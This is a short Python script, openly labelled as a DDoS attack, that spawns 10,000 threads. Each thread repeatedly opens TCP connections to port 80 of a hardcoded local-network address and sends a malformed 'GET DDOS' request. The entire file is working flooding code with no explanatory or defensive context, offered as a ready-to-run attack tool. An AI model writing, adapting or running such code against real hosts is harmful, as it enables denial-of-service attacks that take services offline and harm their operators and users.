import socket
from threading import Thread

host = "192.168.178.150"
ip = socket.gethostbyname(host)
port = 80

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "DDOS" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "DDOS" + "HTTP/1.1 \r\n"), (ip, port))
            print(".", end="")
        except socket.error as e:
            print()
            print("===== Cannot send the packet =====")
        mysocket.close()

print("===== Start DDos Attack =====")
for i in range(10000):
    t = Thread(target=dos)
    t.start()